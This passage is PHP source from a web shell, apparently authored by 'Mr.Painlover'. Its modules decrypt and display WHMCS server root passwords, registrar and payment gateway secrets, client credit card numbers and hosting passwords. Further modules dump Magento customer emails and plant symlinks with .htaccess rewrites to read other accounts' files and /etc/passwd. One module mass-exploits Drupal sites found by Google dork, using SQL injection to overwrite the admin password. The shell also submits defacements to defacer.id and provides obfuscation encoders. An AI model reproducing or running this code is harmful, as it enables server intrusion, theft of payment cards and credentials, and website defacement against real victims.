        <?php
    echo "$kontol";
    } elseif($_GET['do'] == 'whmcskiller') {
    echo "<center><h1>Upload Di 1 Dir Sama Configuration</h1></center>";
    @error_reporting(0); 
    @ini_set('log_errors',0);
    @ini_set('display_errors',0);
    require("configuration.php");
    @mysql_connect($db_host,$db_username,$db_password);
    @mysql_select_db($db_name);
    
    function cut($start,$end,$top){
    $c =strlen($start);
    $desc= strstr("$top","$start");
    $count = strpos("$desc","$end");
    $desc = substr($desc,$c,$count-$c);
    return $desc;
    }
    
    function dec($string,$cc_encryption_hash){
    $key = md5(md5($cc_encryption_hash)) . md5($cc_encryption_hash);
    $hash_key = _hash($key);
    $hash_length = strlen($hash_key);
    $string = base64_decode($string);
    $tmp_iv = substr($string,0,$hash_length);
    $string = substr($string,$hash_length,strlen ($string) - $hash_length);
    $iv = $out = '';
    $c = 0;
    while ($c < $hash_length){
    $iv .= chr(ord($tmp_iv[$c]) ^ ord($hash_key[$c]));
    ++$c;
    }
    $key = $iv;
    $c = 0;
    while ($c < strlen($string)){
    if(($c != 0 AND $c % $hash_length == 0)){
    $key = _hash($key . substr($out,$c - $hash_length,$hash_length));
    }
    $out .= chr(ord($key[$c % $hash_length]) ^ ord ($string[$c]));
    ++$c;
    }
    return $out;
    }
    
    
    function _hash($string){
    if(function_exists("sha1")) {
    $hash = sha1($string);
    } else {
    $hash = md5($string);
    }
    $out = "";
    $c  = 0;
    while ($c < strlen($hash)) {
    $out .= chr(hexdec($hash[$c] . $hash[$c + 1]));
    $c += 2;
    }
    return $out;
    } 
    
    
    
    $query = mysql_query("SELECT *FROM tblservers");
    echo "<hr><br/><center><font color='orange' size='5'><b><u>Host Root</b></u></font></center><br/> <table border='1' cellpadding='5' align='center'>
    <tr> <td align='center'><b> <font color='orange'> TYPE</font></b></td>
    <td align='center'><b> <font color='orange'> ACTIVE </font></b></td>
    <td align='center'><b> <font color='orange'> IP ADDRESS</font></b></td>
    <td align='center'><b> <font color='orange'> USERNAME</font></b></td>
    <td align='center'><b> <font color='orange'> PASSWORD</font></b></td>
    <td align='center'><b> <font color='orange'>ACCESS HASH</font></b></td> 
    <td align='center'><b> <font color='orange'>NAME SERVER</font></b> 
    </tr>";
            
    while($v = mysql_fetch_array($query)) {
    $II11II11II11II11 = fopen("pain.txt","a");
    echo "<tr>
    <td align='center'> <font color='green'> {$v['type']}</font></td>
    <td align='center'> <font color='green'> {$v['active']}</font></td>
    <td align='center'> <font color='green'> {$v['ipaddress']}</font></td>
    <td> <font color='green'> {$v['username']}</font></td>
    <td> <font color='green'> ".dec($v['password'],$cc_encryption_hash)."</font></td>
    <td> <textarea rows='5'>{$v['accesshash']}</textarea></td> 
    <td> <font color='green'> {$v['nameserver1']}</font></td>
    </tr>";
    $bagong = $v['accesshash'];
    fwrite($II11II11II11II11,"~ BY Mr.Painlover ~ \r\n");
    fwrite($II11II11II11II11,$bagong."\r\n"); 
    fwrite($II11II11II11II11,"\r\n");
    fclose($II11II11II11II11); 
    }
    echo "</table>"; 
    $query = mysql_query("SELECT *FROM tblregistrars");
    echo "<center><font color='orange' size='5'><b><u>Domain Registrars</u></b></font></center><br/> <table border='1' align='center' cellpadding='5'>
    <tr> <td align='center'><b> <font color='orange'> REGISTRAR</font></b></td>
    <td align='center'><b> <font color='orange'> SETTING</font></b></td>
    <td align='center'><b> <font color='orange'> VALUE</font> </b></td></tr>";
    while($v = mysql_fetch_array($query)){
    $aru = fopen("nita.txt", "a");
    $value = (!dec($v['value'],$cc_encryption_hash)) ? "0":dec($v['value'],$cc_encryption_hash);
    echo "<tr>
    <td align='center'> <font color='green'> {$v['registrar']}</font></td>
    <td align='center'> <font color='green'> {$v['setting']}</font></td>
    <td align='center'> <font color='green'> $value</font></td></tr>" ;
    fwrite($aru, "$value
    ");
    fclose($aru);
    }
    echo "</table>"; 
    $query = mysql_query("SELECT *FROM tblpaymentgateways");
    echo "<center><font color='orange' size='5'><b><u>Payment Gateway</u></b></font></center><br/> <table border='1' align='center' cellpadding='5'>
    <tr> <td align='center'><b> <font color='orange'> GATEWAY</font></b></td>
    <td align='center'><b> <font color='orange'> SETTING </font></b></td>
    <td align='center'><b> <font color='orange'> VALUE </font></b></td>
    <td align='center'><b> <font color='orange'> ORDER </font></b></td></tr>";
    while($v = mysql_fetch_array($query)){
    echo "<tr>
    <td align='center'> <font color='green'> {$v['gateway']}</font></td>
    <td align='center'> <font color='green'> {$v['setting']}</font></td>
    <td align='center'> <font color='green'> {$v['value']}</font></td>
    <td align='center'> <font color='green'> {$v['order']}</font></td> </tr>" ;
    }
    echo "</table>"; 
    $query = mysql_query("SELECT id FROM tblclients WHERE issuenumber != '' ORDER BY id DESC"); 
    echo "<hr><br/><center><font color='orange' size='5'><b><u>Cilent CC</b></u></font></center><br/> <table border='1' cellpadding='5' align='center'>
    <tr><td align='center'><b> <font color='orange'>CardType</font></b></td>
    <td align='center'><b><font color='orange'>CardNumb </font></b></td>
    <td align='center'><b> <font color='orange'>Expdate</font></b></td>
    <td align='center'><b> <font color='orange'>IssueNumber</font></b></td>
    <td align='center'><b> <font color='orange'>FirstName</font></b></td>
    <td align='center'><b> <font color='orange'>LastName</font></b></td>
    <td align='center'><b><font color='orange'>Address</font></b></td>
    <td align='center'><b> <font color='orange'>Country</font></b></td> 
    <td align='center'><b> <font color='orange'>Phone</font></b></td>
    <td align='center'><b> <font color='orange'>Email</font></b></td> 
    </tr>";
    while($v = mysql_fetch_array($query)) { 
    $cchash = md5($cc_encryption_hash.$v['0']);
    $s = mysql_query("SELECT firstname,lastname,address1,country,phonenumber,cardtype,email,AES_DECRYPT(cardnum,'" . $cchash . "') as cardnum,AES_DECRYPT(expdate,'" . $cchash . "') as expdate,AES_DECRYPT(issuenumber,'" . $cchash . "') as issuenumber FROM tblclients WHERE id='".$v['0']."'");
    $v2=mysql_fetch_array($s); 
    echo "<tr>
    <td align='center'> <font color='green'> ".$v2['cardtype']."</font></td>
    <td align='center'> <font color='green'> ".$v2['cardnum']." </font> </td>
    <td align='center'> <font color='green'> ".$v2['expdate']." </font> </td>
    <td align='center'> <font color='green'> ".$v2['issuenumber']." </font> </td>
    <td align='center'> <font color='green'> ".$v2['firstname']." </font> </td>
    <td align='center'> <font color='green'> ".$v2['lastname']." </font> </td>
    <td align='center'> <font color='green'> ".$v2['address1']." </font> </td>
    <td align='center'> <font color='green'> ".$v2['country']." </font> </td> 
    <td align='center'> <font color='green'> ".$v2['phonenumber']." </font> </td>
    <td align='center'>".$v2['email']." </font> </td></tr>";
    }
    echo "</table>";
    $query = mysql_query("SELECT *FROM tblhosting");
    echo "<center><font color='orange' size='5'><b><u>Clients Hosting Account</u></b></font></center><br/><table border='1' cellpadding='5' align='center'>
    <tr><td align='center'><b> <font color='orange'> DOMAIN</font></b></td>
    <td align='center'><b> <font color='orange'> USERNAME</font></b></td>
    <td align='center'><b> <font color='orange'> PASSWORD</font></b></td>
    <td align='center'><b> <font color='orange'> IP ADDRESS</font></b></td></tr>";
    while($v = mysql_fetch_array($query)){
    echo "<tr>
    <td align='center'> <font color='green'> {$v['domain']}</font></td>
    <td align='center'> <font color='green'> {$v['username']}</font></td>
    <td align='center'> <font color='green'> ".dec($v['password'],$cc_encryption_hash)."</font></td>
    <td align='center'> <font color='green'> {$v['assignedips']}</font></td></tr>";
    }
    echo "</table><br /><br />";
    echo "<center><h1>paypal + smtp login</h1>";
    $query0=mysql_query("SELECT * FROM tblemailtemplates where name='Client Signup Email' or name='Password Reset Confirmation'");
    while($v0=mysql_fetch_array($query0))
    {
    $t=$v0['subject'];
    $t=trim(str_replace('{$company_name}','',$t));
    $c=$v0['message'];
    $c=explode("\n",$c);
    $r="";
    for ($i=0;$i<count($c);$i++) {
    if(strpos($c[$i],'{$client_password}')>0) {
    $r.= $c[$i];
    }elseif(strpos($c[$i],'{$client_email}')>0) {
    $r.= $c[$i];
    }
    }
    $r=preg_quote($r);
    $r=str_replace('\{\$client_email\}','(.*)',$r);
    $r=str_replace('\{\$client_password\}','(.*)',$r);
    $r=str_replace('\{\$whmcs_link\}','(.*)',$r);
    $r=str_replace('\{\$signature\}','(.*)',$r);
    $r=str_replace('\{\$client_name\}','(.*)',$r);
    $r=str_replace("\n","",$r);
    $r=str_replace("\r","",$r);
    $query=mysql_query("SELECT message,userid FROM tblemails where subject like '%".$t."%'");
    while($v=mysql_fetch_array($query))
    {
    $mail=$v['message'];
    $mail=str_replace("\n","",$mail);
    $mail=str_replace("\r","",$mail);
    // echo $mail;
       $reg  = "|(.*)$r(.*)|isU";
       // echo $reg;
    $a=array();
    preg_match_all($reg,($mail),$a);
    for ($i=1;$i<count($a);$i++){
    if( eregi("^[_\.0-9a-z-]+@([0-9a-z-]+\.)+[a-z]{2,10}$",$a[$i][0]) ) {
    $list[$v['userid']]['mail'][]=$a[$i][0];
    $list[$v['userid']]['pass'][]=$a[$i+1][0];
    }
    }
    }
     
    }
    echo("<h3  class=\"tit\">Total Records ".(count($list)-1)."</h3>");
    echo "<table border='1'>";
    foreach ($list as $x=>$y){
    echo "<tr><td><a href='?p=12&id=</a></td><td>".implode("<br>",$y['mail'])."|".implode("<br>",$y['pass'])."</td></tr>";
    }
    echo "</table>";
    echo "<center><h1>smtp</h1>";
       
    $query = mysql_query("SELECT * FROM tblconfiguration where 1");
    
            echo "<table border='1' cellpadding='5' align='center'>";
    
                while($row = mysql_fetch_array($query)){
    
                      if($row[setting] == 'SMTPHost'){
                            echo  "<tr><td>Hostname</td><td>{$row[value]}</td></tr>";
                      }elseif($row[setting] == 'SMTPUsername'){
                            echo  "<tr><td>Username</td><td>{$row[value]}</td></tr>";
                      }elseif($row[setting] == 'SMTPPassword'){
                            echo  "<tr><td>Password</td><td>{$row[value]}</td></tr>";
                      }elseif($row[setting] == 'SMTPPort'){
                            echo  "<tr><td>Port</td><td>{$row[value]}</td></tr>";
                      }
                }
    
            echo "</table>";
    } elseif($_GET['do'] == 'dumper') {
    function ambilKata($param, $kata1, $kata2){
        if(strpos($param, $kata1) === FALSE) return FALSE;
        if(strpos($param, $kata2) === FALSE) return FALSE;
        $start = strpos($param, $kata1) + strlen($kata1);
        $end = strpos($param, $kata2, $start);
        $return = substr($param, $start, $end - $start);
        return $return;
    }
    $i = 0;
    $root = $_SERVER['DOCUMENT_ROOT'];
    $path = "/app/etc/local.xml";
    $config = file_get_contents($root.$path);
    $file = "maling.txt";
    $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
    $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
    $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
    $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
    $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
    $prefix = $dbprefix."customer_entity";
     
    function simpan($file, $isi) {
        $f = fopen($file, "w");
        if(@fwrite($f, $isi)) {
            return "<a href='$file' target='_blank'>$file</a>";
        } else {
            return "Gagal simpan file gann.";
        }
        fclose($f);
    }
     
    mysql_connect($dbhost, $dbuser, $dbpass) or die('MySQL Error: '.mysql_error());
    mysql_select_db($dbname) or die('MySQL Error: '.mysql_error());
    $q = mysql_query("SELECT email FROM $prefix");
    $email = "";
    $email_ = "";
    while($f = mysql_fetch_array($q)) {
        $i++;
        $email .= $f[email]."\n";
        $email_ .= $f[email]."<br>";
    }
    echo "Total: <b>".$i."</b> [ ".simpan($file, $email)."] <br><br>
         $email_";
    } elseif($_GET['do'] == 'vhost') {
        echo "<form method='POST' action=''>";
        echo "<center><br><font size='6'>Bypass Symlink vHost</font><br><br>";
        echo "<center><input type='submit' value='Bypass it' name='Colii'></center>";
            if (isset($_POST['Colii'])){ system('ln -s / pain.txt');
                $fvckem ='T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw';
                $file = fopen(".htaccess","w+"); $write = fwrite ($file ,base64_decode($fvckem)); $Bok3p = symlink("/","pain.txt");
                $rt="<br><a href=pain.txt TARGET='_blank'><font color=#ff0000 size=2 face='Courier New'><b>
        Bypassed Successfully</b></font></a>";
        echo "<br><br><b>Done.. !</b><br><br>Check link given below for / folder symlink <br>$rt</center>";} echo "</form>";
    } elseif($_GET['do'] == 'drupal') {
           set_time_limit(0);
            ini_set('memory_limit', '64M');
            header('Content-Type: text/html; charset=UTF-8');
           
            function letItBy() {
                    ob_flush();
                    flush();
            }
            function google_that($query, $page=1){
                    $resultPerPage=8;
                    $start = $page*$resultPerPage;
                    $url = "http://ajax.googleapis.com/ajax/services/search/web?v=1.0&key=AIzaSyDYG1FME1N7meBZLcywY7VojMHmtUAUIzY&hl=iw&rsz={$resultPerPage}&start={$start}&q=" . urlencode($query);
                    $resultFromGoogle = json_decode( http_get($url, true) ,true);
                    if(isset($resultFromGoogle['responseStatus'])) {
                            if($resultFromGoogle['responseStatus'] != '200') return false;
                            if(sizeof($resultFromGoogle['responseData']['results']) == 0) return false;
                            else return $resultFromGoogle['responseData']['results'];
                    } else
                            die('The function <b>' . __FUNCTION__ . '</b> Kill me :( <br>' . $url );
     
            }
            function http_get($url, $safemode = false){
                    if($safemode === true) sleep(1);
                    $im = curl_init($url);
                    curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
                    curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
                    curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
                    curl_setopt($im, CURLOPT_HEADER, 0);
                    return curl_exec($im);
                    curl_close();
            }
            function check_injection($url){
                    return http_get(str_replace(array("/user/login","?q=node&destination=node","/user/","/login/","/drupal/"), "", $url));
            }
    ?>
    <form method="post">
                            Dork:
                            <input style="border: 1px dashed #008000; background: transparent; color: #bb0000; padding-left: 5px;" type="text" id="dork" name="dork" value="inurl:/user/login" />
                            <input style="border: 1px dashed #008000; background: transparent; color: #bb0000;" type="submit" value="Start" id="button"/>
                    </form>
                    <?php
                            if(isset($_POST['dork']{0})){
                                    echo "<hr width='50%' color='#008000'>";
                                    letItBy();                     
                                    for($googlePage = 1; $googlePage <= 10; $googlePage++){
                                            $googleResult = google_that($_POST['dork'], $googlePage);
                                            if(!$googleResult){
                                                    echo 'google dont have more result, so I done..(?)';
                                                    break;
                                            }
                                            for($victim = 0; $victim < sizeof($googleResult); $victim++) {
                                                    if(check_injection($googleResult[$victim]['unescapedUrl'])){
                                                    echo "<div style='margin: 5px auto; padding-left: 7px;'>";
                                                    $sites = "http://".$googleResult[$victim]['visibleUrl']."";
                                                    $log = "/user/login";
                                                    $post_data = "name[0;update users set name %3D 'sjteam' , pass %3D '" . urlencode('$S$DrV4X74wt6bT3BhJa4X0.XO5bHXl/QBnFkdDkYSHj3cE1Z5clGwu') . "' where uid %3D '1';#]=FcUk&name[]=Crap&pass=test&form_build_id=&form_id=user_login&op=Log+in";
                                            $params = array(
                                                    'http' => array(
                                                    'method' => 'POST',
                                                    'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
                                                    'content' => $post_data
                                                    ));
                                            $ctx = stream_context_create($params);
                                            $data = @file_get_contents($sites . '/user/login/', null, $ctx);
                                            if((stristr($data, 'mb_strlen() expects parameter 1 to be string') && $data) || (stristr($data, 'FcUk Crap') && $data)) {
                                                echo "Scanning: <font color=lime>$sites</font><br>";
                                                echo "Status: Successfully Xploited!<br>";
                                                echo "Data=> user: <font color='#ff3'>sjteam</font> | pass: <font color='#ff3'>admin</font><br>";
                                                echo "Login: <a href='$sites$log' target='_blank' style='text-decoration: none'>$sites$log</a><br><br>";
                                            } else {
                                                    echo "Scanning: <font color=lime>$sites</font><br>";
                                                    echo "Status: <font color=red>Not Xploited!</font><br><br>";
                                                    }
                                            }       echo "</div>";
                                                    letItBy();
                                            }
                                    }
                            }
    } elseif($_GET['do'] == 'hashid') {
    if (isset($_POST['gethash'])) {
            $hash = $_POST['hash'];
            if (strlen($hash) == 32) {
                $hashresult = "MD5 Hash";
            } elseif (strlen($hash) == 40) {
                $hashresult = "SHA-1 Hash/ /MySQL5 Hash";
            } elseif (strlen($hash) == 13) {
                $hashresult = "DES(Unix) Hash";
            } elseif (strlen($hash) == 16) {
                $hashresult = "MySQL Hash / /DES(Oracle Hash)";
            } elseif (strlen($hash) == 41) {
                $GetHashChar = substr($hash, 40);
                if ($GetHashChar == "*") {
                    $hashresult = "MySQL5 Hash";
                }
            } elseif (strlen($hash) == 64) {
                $hashresult = "SHA-256 Hash";
            } elseif (strlen($hash) == 96) {
                $hashresult = "SHA-384 Hash";
            } elseif (strlen($hash) == 128) {
                $hashresult = "SHA-512 Hash";
            } elseif (strlen($hash) == 34) {
                if (strstr($hash, '$1$')) {
                    $hashresult = "MD5(Unix) Hash";
                }
            } elseif (strlen($hash) == 37) {
                if (strstr($hash, '$apr1$')) {
                    $hashresult = "MD5(APR) Hash";
                }
            } elseif (strlen($hash) == 34) {
                if (strstr($hash, '$H$')) {
                    $hashresult = "MD5(phpBB3) Hash";
                }
            } elseif (strlen($hash) == 34) {
                if (strstr($hash, '$P$')) {
                    $hashresult = "MD5(Wordpress) Hash";
                }
            } elseif (strlen($hash) == 39) {
                if (strstr($hash, '$5$')) {
                    $hashresult = "SHA-256(Unix) Hash";
                }
            } elseif (strlen($hash) == 39) {
                if (strstr($hash, '$6$')) {
                    $hashresult = "SHA-512(Unix) Hash";
                }
            } elseif (strlen($hash) == 24) {
                if (strstr($hash, '==')) {
                    $hashresult = "MD5(Base-64) Hash";
                }
            } else {
                $hashresult = "Hash type not found";
            }
        } else {
            $hashresult = "Not Hash Entered";
        }
    ?>
        <center><br><Br><br>
        
            <form action="" method="POST">
            <tr>
            <table >
            <th colspan="5">Hash Identification</th>
            <tr class="optionstr"><B><td>Enter Hash</td></b><td>:</td>	<td><input type="text" name="hash" size='60' class="inputz" /></td><td><input type="submit" class="inputzbut" name="gethash" value="Identify Hash" /></td></tr>
            <tr class="optionstr"><b><td>Result</td><td>:</td><td><?php echo $hashresult; ?></td></tr></b>
        </table></tr></form>
        </center>
    <?php
    
    
    } elseif($_GET['do'] == 'hash') {
     $submit = $_POST['enter'];
       
     if (isset($submit)) {
         
       $pass = $_POST['password']; // password
          
      $salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
     
         $hash = md5($pass); // md5 hash #1
         
       $md4 = hash("md4", $pass);
            $hash_md5 = md5($salt . $pass); // md5 hash with salt #2
       
         $hash_md5_double = md5(sha1($salt . $pass)); // md5 hash with salt & sha1 #3
         
       $hash1 = sha1($pass); // sha1 hash #4
            $sha256 = hash("sha256", $text);
         
       $hash1_sha1 = sha1($salt . $pass); // sha1 hash with salt #5
           
     $hash1_sha1_double = sha1(md5($salt . $pass)); // sha1 hash with salt & md5 #6
         
       
        }
        echo '<form action="" method="post"><b> ';
      
      echo '<center><h2><b>-=[ Password Hash]=-</b></h2></center><table>';
     
       echo '<tr><td>masukan kata yang ingin di encrypt:</td> ';
      
      echo ' <td><input class="inputz" type="text" name="password" size="40" /></td></tr>';
     
       echo '<input class="inputzbut" type="submit" name="enter" value="hash" />';
      
      echo ' <br>';
        echo ' Hasil Hash</th></center></tr>';
     
       echo ' Original Password  <input class=inputz type=text size=50 value=' . $pass . '> <br><br>';
     
       echo ' MD5  <input class=inputz type=text size=50 value=' . $hash . '> <br><br>';
        
    echo ' MD4  <input class=inputz type=text size=50 value=' . $md4 . '> <br><br>';
        
    echo ' MD5 with Salt  <input class=inputz type=text size=50 value=' . $hash_md5 . '> <br><br>';
      
      echo ' MD5 with Salt & Sha1  <input class=inputz type=text size=50 value=' . $hash_md5_double . '> <br><br>';
    
        echo ' Sha1  <input class=inputz type=text size=50 value=' . $hash1 . '> <br><br>';
     
       echo ' Sha256  <input class=inputz type=text size=50 value=' . $sha256 . '> <br><br>';
     
       echo ' Sha1 with Salt  <input class=inputz type=text size=50 value=' . $hash1_sha1 . '> <br><br>';
     
       echo ' Sha1 with Salt & MD5  <input class=inputz type=text size=50 value=' . $hash1_sha1_double . '> <br><br>';
    
    
    } elseif($_GET['do'] == 'defacerid') {
    echo "<center><form method='post'>
            <u>Defacer</u>: <br>
            <input type='text' name='hekel' size='50' value='Mr.Painlover'><br>
            <u>Team</u>: <br>
            <input type='text' name='tim' size='50' value='Bert Family'><br>
            <u>Domains</u>: <br>
            <textarea style='width: 450px; height: 150px;' name='sites'></textarea><br>
            <input type='submit' name='go' value='Submit' style='width: 450px;'>
            </form>";
    $site = explode("\r\n", $_POST['sites']);
    $go = $_POST['go'];
    $hekel = $_POST['hekel'];
    $tim = $_POST['tim'];
    if($go) {
    foreach($site as $sites) {
    $zh = $sites;
    $form_url = "https://www.defacer.id/notify";
    $data_to_post = array();
    $data_to_post['attacker'] = "$hekel";
    $data_to_post['team'] = "$tim";
    $data_to_post['poc'] = 'SQL Injection';
    $data_to_post['url'] = "$zh";
    $curl = curl_init();
    curl_setopt($curl,CURLOPT_URL, $form_url);
    curl_setopt($curl,CURLOPT_POST, sizeof($data_to_post));
    curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
    curl_setopt($curl,CURLOPT_POSTFIELDS, $data_to_post);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl, CURLOPT_REFERER, 'https://defacer.id/notify.html');
    $result = curl_exec($curl);
    echo $result;
    curl_close($curl);
    echo "<br>";
    }
    }
    
    }
    elseif ($_GET['do'] == 'string') {
      $text = $_POST['code'];
      ?><center>
      <center class='mybox'><h1>String Encode & Decode</h1>
      <form method="post"><br>
      <textarea class='mybox' cols=80 rows=10 name="code"></textarea><br><br>
      <select size="1" name="ope">
      <option value="urlencode" style='background:transparent;color:aqua;'>url</option>
      <option value="base64" style='background:transparent;color:aqua;'>Base64</option>
      <option value="ur" style='background:transparent;color:aqua;'>convert_uu</option>
      <option value="json" style='background:transparent;color:aqua;'>json</option>
      <option value="gzinflates" style='background:transparent;color:aqua;'>gzinflate - base64</option>
      <option value="str2" style='background:transparent;color:aqua;'>str_rot13 - base64</option>
      <option value="gzinflate" style='background:transparent;color:aqua;'>str_rot13 - gzinflate - base64</option>
      <option value="gzinflater" style='background:transparent;color:aqua;'>gzinflate - str_rot13 - base64</option>
      <option value="gzinflatex" style='background:transparent;color:aqua;'>gzinflate - str_rot13 - gzinflate - base64</option>
      <option value="gzinflatew" style='background:transparent;color:aqua;'>str_rot13 - convert_uu - url - gzinflate - str_rot13 - base64 - convert_uu - gzinflate - url - str_rot13 - gzinflate - base64</option>
      <option value="str" style='background:transparent;color:aqua;'>str_rot13 - gzinflate - str_rot13 - base64</option>
      <option value="url" style='background:transparent;color:aqua;'>base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
      <option value="hexencode" style='background:transparent;color:aqua;'>Hex Encode/Decode</option>
      <option value="md5" style='background:transparent;color:aqua;'>MD5 Hash</option>
      <option value="sha1" style='background:transparent;color:aqua;'>SHA1 Hash</option>
      <option value="str_rot13" style='background:transparent;color:aqua;'>ROT13 Hash</option>
      <option value="strlen" style='background:transparent;color:aqua;'>strlen</option>
      <option value="xxx" style='background:transparent;color:aqua;'>unescape</option>
      <option value="bbb" style='background:transparent;color:aqua;'>charAt</option>
      <option value="aaa" style='background:transparent;color:aqua;'>chr - bin2hex - substr</option>
      <option value="www" style='background:transparent;color:aqua;'>chr</option>
      <option value="sss" style='background:transparent;color:aqua;'>htmlspecialchars</option>
      <option value="eee" style='background:transparent;color:aqua;'>escape</option></select>&nbsp;
      <input class='kotak' type='submit' name='submit' value='Encrypt'>
      <input class='kotak' type='submit' name='crack' value='Decrypt'>
      </form>
      <?php
      $submit = $_POST['submit'];
      if (isset($submit)) {
          $op = $_POST["ope"];
          switch ($op) {
              case 'base64':
                  $codi = base64_encode($text);
              break;
              case 'str':
                  $codi = (base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
              break;
              case 'json':
                  $codi = json_encode(utf8_encode($text));
              break;
              case 'gzinflate':
                  $codi = base64_encode(gzdeflate(str_rot13($text)));
              break;
              case 'gzinflater':
                  $codi = base64_encode(str_rot13(gzdeflate($text)));
              break;
              case 'gzinflatex':
                  $codi = base64_encode(gzdeflate(str_rot13(gzdeflate($text))));
              break;
              case 'gzinflatew':
                  $codi = base64_encode(gzdeflate(str_rot13(rawurlencode(gzdeflate(convert_uuencode(base64_encode(str_rot13(gzdeflate(convert_uuencode(rawurldecode(str_rot13($text))))))))))));
              break;
              case 'gzinflates':
                  $codi = base64_encode(gzdeflate($text));
              break;
              case 'str2':
                  $codi = base64_encode(str_rot13($text));
              break;
              case 'urlencode':
                  $codi = rawurlencode($text);
              break;
              case 'hexencode':
                  $codi = bin2hex($text);
              break;
              case 'md5':
                  $codi = md5($text);
              break;
              case 'ur':
                  $codi = convert_uuencode($text);
              break;
              case 'str_rot13':
                  $codi = str_rot13($text);
              break;
              case 'sha1':
                  $codi = sha1($text);
              break;
              case 'strlen':
                  $codi = strlen($text);
              break;
              case 'xxx':
                  $codi = strlen(bin2hex($text));
              break;
              case 'bbb':
                  $codi = htmlentities(utf8_decode($text));
              break;
              case 'aaa':
                  $codi = chr(bin2hex(substr($text)));
              break;
              case 'www':
                  $codi = chr($text);
              break;
              case 'sss':
                  $codi = htmlspecialchars($text);
              break;
              case 'eee':
                  $codi = addslashes($text);
              break;
              case 'url':
                  $codi = base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
              break;
              default:
              break;
          }
      }
      // Decrypt Start Now !!
      $submit = $_POST['crack'];
      if (isset($submit)) {
          $op = $_POST["ope"];
          switch ($op) {
              case 'base64':
                  $codi = base64_decode($text);
              break;
              case 'str':
                  $codi = str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
              break;
              case 'json':
                  $codi = utf8_dencode(json_dencode($text));
              break;
              case 'gzinflate':
                  $codi = str_rot13(gzinflate(base64_decode($text)));
              break;
              case 'gzinflater':
                  $codi = gzinflate(str_rot13(base64_decode($text)));
              break;
              case 'gzinflatex':
                  $codi = gzinflate(str_rot13(gzinflate(base64_decode($text))));
              break;
              case 'gzinflatew':
                  $codi = str_rot13(rawurldecode(convert_uudecode(gzinflate(str_rot13(base64_decode(convert_uudecode(gzinflate(rawurldecode(str_rot13(gzinflate(base64_decode($text))))))))))));
              break;
              case 'gzinflates':
                  $codi = gzinflate(base64_decode($text));
              break;
              case 'str2':
                  $codi = str_rot13(base64_decode($text));
              break;
              case 'urlencode':
                  $codi = rawurldecode($text);
              break;
              case 'hexencode':
                  $codi = quoted_printable_decode($text);
              break;
              case 'ur':
                  $codi = convert_uudecode($text);
              break;
              case 'url':
                  $codi = base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($text)))))));
              break;
              default:
              break;
          }
      }
      echo '<textarea cols=80 rows=10 class="mybox" readonly>' . $codi . '</textarea></center><BR><BR>';
    }
    elseif($_GET['do'] == 'symlink2') {
    $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
    $d0mains = @file("/etc/named.conf");
    ##httaces
    if($d0mains){
    @mkdir("pain_sym",0777);
    @chdir("pain_sym");
    @exe("ln -s / root");
    $file3 = 'Options Indexes FollowSymLinks
    DirectoryIndex pain.htm
    AddType text/plain .php
    AddHandler text/plain .php
    Satisfy Any';
    $fp3 = fopen('.htaccess','w');
    $fw3 = fwrite($fp3,$file3);@fclose($fp3);
    echo "
    <table align=center border=1 style='width:60%;border-color:#333333;'>
    <tr>
    <td align=center><font size=2>S. No.</font></td>
    <td align=center><font size=2>Domains</font></td>
    <td align=center><font size=2>Users</font></td>
    <td align=center><font size=2>Symlink</font></td>
    </tr>";
    $dcount = 1;
    foreach($d0mains as $d0main){
    if(eregi("zone",$d0main)){preg_match_all('#zone "(.*)"#', $d0main, $domains);
    flush();
    if(strlen(trim($domains[1][0])) > 2){
    $user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));
    echo "<tr align=center><td><font size=2>" . $dcount . "</font></td>
    <td align=left><a href=http://www.".$domains[1][0]."/><font class=txt>".$domains[1][0]."</font></a></td>
    <td>".$user['name']."</td>
    <td><a href='$full/pain_sym/root/home/".$user['name']."/public_html' target='_blank'><font class=txt>Symlink</font></a></td></tr>";
    flush();
    $dcount++;}}}
    echo "</table>";
    }else{
    $TEST=@file('/etc/passwd');
    if ($TEST){
    @mkdir("pain_sym",0777);
    @chdir("pain_sym");
    exe("ln -s / root");
    $file3 = 'Options Indexes FollowSymLinks
    DirectoryIndex pain.htm
    AddType text/plain .php
    AddHandler text/plain .php
    Satisfy Any';
     $fp3 = fopen('.htaccess','w');
     $fw3 = fwrite($fp3,$file3);
     @fclose($fp3);
     echo "
     <table align=center border=1><tr>
     <td align=center><font size=3>S. No.</font></td>
     <td align=center><font size=3>Users</font></td>
     <td align=center><font size=3>Symlink</font></td></tr>";
     $dcount = 1;
     $file = fopen("/etc/passwd", "r") or exit("Unable to open file!");
     while(!feof($file)){
     $s = fgets($file);
     $matches = array();
     $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
     $matches = str_replace("home/","",$matches[1]);
